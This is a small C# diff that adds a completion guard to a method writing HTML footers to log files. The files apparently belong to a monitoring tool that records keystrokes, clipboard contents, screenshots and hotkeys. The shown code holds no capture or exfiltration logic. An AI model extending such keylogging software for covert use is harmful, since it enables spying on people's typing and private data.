@@ -14,13 +14,17 @@ public class WriteTo
     /// </summary>
     public static void Complete()
     {
-        writeToFile(Globals.snapshothtmlAddress, Globals.htmlFoot);
-        writeToFile(Globals.clipboardhtmlAddress, Globals.htmlFoot);
-        writeToFile(Globals.outputAddress, Globals.htmlFoot);
-        writeToFile(Globals.attentionAddress, Globals.htmlFoot);
-        writeToFile(Globals.errorAddress, Globals.htmlFoot);
-        writeToFile(Globals.keyloggerAddress, Globals.htmlFoot);
-        writeToFile(Globals.hotkeyAddress, Globals.htmlFoot);
+        if (Globals.DONE == false)
+        {
+            writeToFile(Globals.keyloggerAddress, Globals.htmlFoot);
+            writeToFile(Globals.snapshothtmlAddress, Globals.htmlFoot);
+            writeToFile(Globals.clipboardhtmlAddress, Globals.htmlFoot);
+            writeToFile(Globals.outputAddress, Globals.htmlFoot);
+            writeToFile(Globals.attentionAddress, Globals.htmlFoot);
+            writeToFile(Globals.errorAddress, Globals.htmlFoot);
+            
+            writeToFile(Globals.hotkeyAddress, Globals.htmlFoot);
+        }
     }
 
     /// <summary>
